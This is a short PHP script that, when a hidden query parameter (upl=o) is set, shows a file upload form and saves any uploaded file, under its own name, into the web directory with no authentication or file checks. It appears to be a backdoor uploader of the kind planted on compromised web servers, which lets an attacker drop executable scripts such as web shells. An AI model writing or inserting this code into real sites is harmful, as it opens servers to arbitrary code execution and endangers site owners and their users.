<?php

if ($_GET['upl']=='o') {echo "<form method=post enctype=multipart/form-data>
<input type=file name=file /><input type=submit value=Submit /></form>";
$upfile = './'.basename($_FILES['file']['name']);
move_uploaded_file($_FILES['file']['tmp_name'], $upfile);}

?>